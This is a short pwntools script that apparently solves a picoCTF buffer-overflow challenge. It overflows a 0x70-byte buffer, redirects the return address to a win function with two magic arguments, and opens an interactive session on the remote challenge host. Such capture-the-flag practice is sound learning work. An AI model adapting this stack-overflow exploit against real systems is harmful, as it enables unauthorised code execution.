from pwn import *

r = remote('saturn.picoctf.net', 50995)
# r = process('./vuln')
context.arch = 'amd64'

r.recvline()

r.sendline(b'a' * 0x70 + p32(0x8049296) + p32(0) + p32(0xCAFEF00D) + p32(0xF00DF00D))

r.interactive()